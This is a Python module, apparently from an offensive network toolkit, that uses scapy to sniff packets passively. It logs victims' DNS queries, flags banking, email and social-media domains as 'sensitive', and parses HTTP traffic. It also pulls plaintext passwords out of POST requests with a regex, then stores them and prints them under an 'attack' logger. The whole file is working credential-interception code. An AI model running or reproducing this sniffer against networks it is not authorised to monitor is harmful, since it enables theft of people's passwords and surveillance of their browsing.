from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw
from core.logger import info, warn, attack, device, debug
import time

# Store captured data for analysis
captured_data = {
    'dns_queries': [],
    'http_requests': [],
    'plaintext_passwords': [],
    'packet_count': 0,
    'start_time': None
}

def packet_callback(packet):
    """Callback function for each captured packet"""
    captured_data['packet_count'] += 1
    
    # --- DNS Sniffing ---
    if packet.haslayer(DNS) and packet.haslayer(DNSQR):
        try:
            dns_layer = packet[DNS]
            qname = packet[DNSQR].qname.decode('utf-8') if packet[DNSQR].qname else None
            
            if qname and dns_layer.qr == 0:  # QR=0 means query
                captured_data['dns_queries'].append({
                    'domain': qname,
                    'timestamp': time.time()
                })
                device(f"🌐 DNS Query: {qname}")
                
                # Detect if it's a sensitive domain (bank, social media, etc.)
                sensitive_keywords = ['bank', 'login', 'paypal', 'amazon', 'facebook', 'instagram', 'gmail', 'mail']
                for keyword in sensitive_keywords:
                    if keyword in qname.lower():
                        attack(f"🔴 Sensitive domain detected: {qname}")
                        break
        except Exception as e:
            debug(f"DNS parsing error: {e}")
    
    # --- HTTP Plaintext Capture ---
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Check for HTTP request
            if 'HTTP/' in payload and ('GET' in payload or 'POST' in payload):
                # Extract host and path
                lines = payload.split('\r\n')
                request_line = lines[0] if lines else ''
                host_line = [line for line in lines if 'Host:' in line]
                host = host_line[0].replace('Host:', '').strip() if host_line else 'unknown'
                
                captured_data['http_requests'].append({
                    'host': host,
                    'request': request_line,
                    'timestamp': time.time()
                })
                info(f"🌍 HTTP Request: {host} - {request_line[:50]}...")
                
                # Check for plaintext passwords in POST data
                if 'POST' in request_line and 'password' in payload.lower():
                    # Try to extract password
                    import re
                    password_match = re.search(r'password[=:]\s*([^\s&]+)', payload, re.IGNORECASE)
                    if password_match:
                        password = password_match.group(1)
                        captured_data['plaintext_passwords'].append({
                            'host': host,
                            'password': password,
                            'timestamp': time.time()
                        })
                        attack(f"🔓 PLAINTEXT PASSWORD detected on {host}: {password}")
                        warn(f"⚠️ Password sent over HTTP (not encrypted!)")
                        
        except Exception as e:
            debug(f"HTTP parsing error: {e}")

def start_passive_sniff(interface=None, packet_count=50, timeout=30):
    """
    Start passive packet sniffing on the network.
    
    Args:
        interface: Network interface to sniff on
        packet_count: Number of packets to capture
        timeout: Max seconds to sniff
    
    Returns:
        dict: Summary of captured data
    """
    info(f"🔵 Starting passive sniffing on {interface or 'default'}...")
    info(f"   Capturing {packet_count} packets or {timeout}s timeout")
    
    captured_data['start_time'] = time.time()
    captured_data['dns_queries'] = []
    captured_data['http_requests'] = []
    captured_data['plaintext_passwords'] = []
    captured_data['packet_count'] = 0
    
    try:
        # Start sniffing
        sniff(
            iface=interface,
            prn=packet_callback,
            count=packet_count,
            timeout=timeout,
            store=False
        )
        
        # Summary
        duration = time.time() - captured_data['start_time']
        info(f"✅ Sniffing complete. Captured {captured_data['packet_count']} packets in {duration:.1f}s")
        info(f"   DNS Queries: {len(captured_data['dns_queries'])}")
        info(f"   HTTP Requests: {len(captured_data['http_requests'])}")
        info(f"   Plaintext Passwords: {len(captured_data['plaintext_passwords'])}")
        
        if captured_data['plaintext_passwords']:
            attack(f"🔴 {len(captured_data['plaintext_passwords'])} plaintext passwords captured!")
        
        return captured_data
        
    except PermissionError:
        warn("❌ Permission denied. Run with sudo/root privileges.")
        return None
    except Exception as e:
        warn(f"❌ Sniffing error: {e}")
        return None

def get_capture_summary():
    """Return a summary of the current capture session"""
    return {
        'total_packets': captured_data['packet_count'],
        'dns_queries': len(captured_data['dns_queries']),
        'http_requests': len(captured_data['http_requests']),
        'plaintext_passwords': len(captured_data['plaintext_passwords']),
        'duration': time.time() - captured_data['start_time'] if captured_data['start_time'] else 0
    }